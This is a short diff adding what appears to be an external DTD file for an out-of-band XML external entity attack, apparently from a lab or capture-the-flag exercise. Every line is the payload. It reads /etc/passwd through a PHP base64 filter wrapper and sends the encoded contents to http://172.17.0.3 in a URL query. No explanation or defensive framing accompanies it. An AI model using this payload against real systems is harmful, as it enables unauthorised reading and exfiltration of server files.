@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM 
+"php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://172.17.0.3/?%file;'>">
+%all;
